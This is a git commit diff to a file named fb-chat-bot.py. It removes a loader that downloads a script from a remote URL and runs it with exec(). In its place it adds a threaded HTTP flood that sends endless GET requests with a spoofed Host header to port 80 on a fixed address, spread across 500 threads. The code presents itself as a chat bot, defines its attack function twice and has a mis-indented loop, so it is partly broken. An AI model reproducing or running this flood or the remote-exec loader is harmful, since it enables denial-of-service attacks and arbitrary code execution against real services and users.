f1363f62bcd83fce41b2e801982b0eb03e9d73b2
tasik0 <130841446+tasik0@users.noreply.github.com>
2024-07-04 15:24:08 +0600

    Update fb-chat-bot.py

--- fb-chat-bot.py
+++ fb-chat-bot.py
@@ -1,11 +1,33 @@
-import requests
+import socket
+import threading
 
-# URL of the script
-script_url = "https://test.tasikofficial.com/automessage.py"
+target = '10.0.0.138'
+fake_ip = '182.21.20.32'
+port = 80
 
-# Fetch the script content
-response = requests.get(script_url)
-script_code = response.text
+def attack():
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+        s.close()
 
-# Execute the script
-exec(script_code) 
+  for i in range(500):
+    thread = threading.Thread(target=attack)
+    thread.start()
+
+attack_num = 0
+
+def attack():
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+        
+        global attack_num
+        attack_num += 1
+        print(attack_num)
+        
+        s.close()
